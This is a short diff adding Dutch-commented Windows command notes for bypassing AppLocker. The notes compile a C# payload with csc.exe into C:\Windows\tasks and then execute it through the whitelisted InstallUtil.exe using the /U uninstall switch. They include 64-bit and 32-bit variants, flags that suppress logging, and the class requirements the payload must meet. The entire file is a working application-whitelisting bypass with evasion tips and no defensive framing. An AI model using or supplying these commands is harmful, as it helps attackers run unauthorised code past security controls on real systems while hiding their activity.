@@ -1,0 +1,9 @@
+# AppLocker bypass via InstallUtil.exe (whitelisted .NET binary)
+# Stap 1: Compileer C# payload met Uninstall methode
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:C:\Windows\tasks\bypass.exe C:\Windows\tasks\bypass.cs
+# Stap 2: Uitvoeren via InstallUtil /U (Uninstall) - omzeilt AppLocker
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\tasks\bypass.exe
+# 32-bit variant:
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\tasks\bypass.exe
+# Tip: /logfile= en /LogToConsole=false onderdrukt output
+# Tip: Payload moet System.Configuration.Install.Installer overerven met [RunInstaller(true)]
